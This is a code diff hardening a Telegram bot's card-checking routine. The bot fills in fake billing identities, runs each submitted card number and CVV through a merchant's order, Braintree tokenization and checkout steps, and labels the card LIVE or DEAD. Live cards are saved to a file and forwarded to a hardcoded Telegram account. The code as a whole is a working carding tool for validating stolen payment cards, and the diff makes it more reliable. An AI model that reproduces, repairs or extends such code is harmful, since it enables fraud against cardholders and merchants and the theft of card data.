@@ -242,23 +242,46 @@ async function processCard(chatId, cardText) {
     };
 
     try {
-        // Get random user info
-        const userInfo = await axios.get('https://randomuser.me/api/');
-        const user = userInfo.data.results[0];
-        
-        const userDetails = {
-            n: user.name.first,
-            l: user.name.last,
-            e: randomString(7) + '@gmail.com',
-            st: `${user.location.street.number} ${user.location.street.name}`,
-            ct: user.location.city,
-            state: user.location.state,
-            country: user.location.country,
-            zip: user.location.postcode,
-            phn: '212' + Math.floor(Math.random() * 10000000),
-            formkey: randomString(16),
-            webkey: randomString(16)
-        };
+        // Get random user info with error handling
+        let userDetails;
+        try {
+            const userInfo = await axios.get('https://randomuser.me/api/', { timeout: 5000 });
+            const user = userInfo.data?.results?.[0];
+            
+            if (user && user.name) {
+                userDetails = {
+                    n: user.name.first,
+                    l: user.name.last,
+                    e: randomString(7) + '@gmail.com',
+                    st: `${user.location.street.number} ${user.location.street.name}`,
+                    ct: user.location.city,
+                    state: user.location.state,
+                    country: user.location.country,
+                    zip: user.location.postcode,
+                    phn: '212' + Math.floor(Math.random() * 10000000),
+                    formkey: randomString(16),
+                    webkey: randomString(16)
+                };
+            } else {
+                throw new Error('Invalid user data');
+            }
+        } catch (apiError) {
+            // Fallback to random generated data
+            console.log('Random user API failed, using fallback data:', apiError.message);
+            userDetails = {
+                n: 'John',
+                l: 'Doe',
+                e: randomString(7) + '@gmail.com',
+                st: `${Math.floor(Math.random() * 9999) + 1} Main Street`,
+                ct: 'New York',
+                state: 'NY',
+                country: 'United States',
+                zip: String(Math.floor(Math.random() * 90000) + 10000),
+                phn: '212' + Math.floor(Math.random() * 10000000),
+                formkey: randomString(16),
+                webkey: randomString(16)
+            };
+        }
 
         await sendMessage(chatId, `⏳ Checking: \`${cardText}\`\n\nPlease wait...`, true);
 
@@ -282,7 +305,11 @@ async function processCard(chatId, cardText) {
                     cookie
                 );
 
-                const userSessionId = JSON.parse(order).Result.order.userSessionId;
+                const orderData = JSON.parse(order);
+                if (!orderData?.Result?.order?.userSessionId) {
+                    throw new Error('Failed to create order - invalid response');
+                }
+                const userSessionId = orderData.Result.order.userSessionId;
 
                 // Step 2: Get Payment Client Token
                 const tokenResponse = await makeRequest(
@@ -296,9 +323,17 @@ async function processCard(chatId, cardText) {
                     cookie
                 );
 
-                const clientToken = JSON.parse(tokenResponse).ClientToken;
+                const tokenData = JSON.parse(tokenResponse);
+                if (!tokenData?.ClientToken) {
+                    throw new Error('Failed to get payment token - invalid response');
+                }
+                const clientToken = tokenData.ClientToken;
                 const decodedToken = Buffer.from(clientToken, 'base64').toString('utf-8');
                 const authorizationFingerprint = extractString(decodedToken, '"authorizationFingerprint":"', '"');
+                
+                if (!authorizationFingerprint) {
+                    throw new Error('Failed to extract authorization fingerprint');
+                }
 
                 // Step 3: Add Concessions
                 await makeRequest(
@@ -349,7 +384,11 @@ async function processCard(chatId, cardText) {
                     cookie
                 );
 
-                const token = JSON.parse(braintreeResponse).data.tokenizeCreditCard.token;
+                const braintreeData = JSON.parse(braintreeResponse);
+                if (!braintreeData?.data?.tokenizeCreditCard?.token) {
+                    throw new Error('Failed to tokenize card - invalid response from Braintree');
+                }
+                const token = braintreeData.data.tokenizeCreditCard.token;
 
                 // Step 5: Checkout
                 const checkoutResponse = await makeRequest(
@@ -396,7 +435,14 @@ async function processCard(chatId, cardText) {
                     fs.appendFileSync('CCNLIVES_TG.txt', cardText + '\n');
                     await forwardersd(`Live Card ${cc}|${mm}|${yyyy}|${cvv} galing bot pare`, 6050175626);
                     
-                    const errorMsg = JSON.parse(responseText).ErrorMessage || 'Success';
+                    let errorMsg = 'Success';
+                    try {
+                        const parsedResponse = JSON.parse(responseText);
+                        errorMsg = parsedResponse.ErrorMessage || 'Success';
+                    } catch (parseError) {
+                        console.error('Failed to parse live response:', parseError);
+                        errorMsg = 'Payment Authorised';
+                    }
                     result = {
                         status: 'live',
                         message: `✅ *LIVE*\n\n💳 \`${cardText}\`\n\n📝 *Response:*\nPayment Authorised [${errorMsg}]`
@@ -420,7 +466,14 @@ async function processCard(chatId, cardText) {
                         message: `❌ *DEAD*\n\n💳 \`${cardText}\`\n\n📝 *Response:*\n${errorMsg}`
                     };
                 } else {
-                    const errorMsg = JSON.parse(responseText).ErrorMessage || 'Declined';
+                    let errorMsg = 'Declined';
+                    try {
+                        const parsedResponse = JSON.parse(responseText);
+                        errorMsg = parsedResponse.ErrorMessage || 'Declined';
+                    } catch (parseError) {
+                        console.error('Failed to parse response:', parseError);
+                        errorMsg = responseText.substring(0, 100) || 'Declined';
+                    }
                     result = {
                         status: 'dead',
                         message: `❌ *DEAD*\n\n💳 \`${cardText}\`\n\n📝 *Response:*\n${errorMsg}`
